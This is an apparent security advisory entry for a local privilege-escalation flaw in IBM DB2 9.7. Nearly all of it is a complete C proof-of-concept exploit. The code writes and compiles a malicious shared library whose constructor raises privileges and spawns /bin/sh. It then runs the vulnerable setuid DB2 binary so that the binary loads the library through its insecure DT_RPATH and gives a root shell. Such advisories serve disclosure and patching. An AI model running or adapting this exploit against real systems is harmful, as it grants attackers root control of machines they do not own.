source: http://www.securityfocus.com/bid/48514/info

IBM DB2 is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue to gain elevated privileges and execute arbitrary code with root privileges. Successfully exploiting this issue will result in a complete compromise of the affected system.

IBM DB2 9.7 is vulnerable; other versions may also be affected. 

/*
Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this
list of conditions and the following disclaimer.
* Redistributions in binary form must reproduce the above copyright notice,
this list of conditions and the following disclaimer in the documentation
and/or other materials provided with the distribution.
* Neither the name of the Nth Dimension nor the names of its contributors may
be used to endorse or promote products derived from this software without
specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

(c) Tim Brown, 2011
<mailto:timb@nth-dimension.org.uk>
<http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>

PoC exploit for IBM DB2 DT_RPATH privesc.
*/

#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv) {
	FILE *badlibkbbsrchandle;
	int pwnedflag;
	printf("PoC exploit for IBM DB2 DT_RPATH privesc.\r\n");
	printf("(c) Tim Brown, 2011\r\n");
	printf("<mailto:timb@nth-dimension.org.uk>\r\n");
	printf("<http://www.nth-dimension.org.uk/> / <http://www.machine.org.uk/>\r\n");
	printf("Constructing bad_libkbb.so...\r\n");
	badlibkbbsrchandle = fopen("bad_libkbb.c", "w");
	fprintf(badlibkbbsrchandle, "#include <stdio.h>\r\n");
	fprintf(badlibkbbsrchandle, "#include <unistd.h>\r\n");
	fprintf(badlibkbbsrchandle, "#include <stdlib.h>\r\n");
	fprintf(badlibkbbsrchandle, "\r\n");
	fprintf(badlibkbbsrchandle, "void __attribute__ ((constructor)) bad_libkbb(void) {\r\n");
	fprintf(badlibkbbsrchandle, "	printf(\"Have a root shell...\\r\\n\");\r\n");
	fprintf(badlibkbbsrchandle, "	setuid(geteuid());\r\n");
	fprintf(badlibkbbsrchandle, "	system(\"/usr/bin/id\");\r\n");
	fprintf(badlibkbbsrchandle, "	system(\"/bin/sh\");\r\n");
	fprintf(badlibkbbsrchandle, "	exit(0);\r\n");
	fprintf(badlibkbbsrchandle, "}\r\n");
	fclose(badlibkbbsrchandle);
	system("gcc -shared -fPIC -o libkbb.so bad_libkbb.c");
	system("/opt/ibm/db2/V9.7/itma/tmaitm6/lx8266/bin/kbbacf1");
	exit(0);
}